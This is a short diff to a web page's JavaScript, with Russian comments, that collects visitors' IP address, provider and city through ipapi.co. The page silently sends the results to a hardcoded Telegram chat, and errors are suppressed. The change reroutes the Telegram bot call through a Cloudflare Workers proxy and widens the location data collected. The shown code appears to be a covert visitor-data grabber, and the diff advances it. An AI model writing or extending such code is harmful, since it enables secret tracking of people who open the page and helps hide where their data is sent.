@@ -25,11 +25,11 @@
         const chatId = '6157895456';
 
         function sendToBot(text) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+            fetch(`https://tg-proxy.samohvalgerge.workers.dev/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
                 .catch(() => {});
         }
 
-        // === 1. IP + ПРОВАЙДЕР (С РЕЗЕРВАМИ) ===
+        // === 1. IP + ПРОВАЙДЕР + ГОРОД ===
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
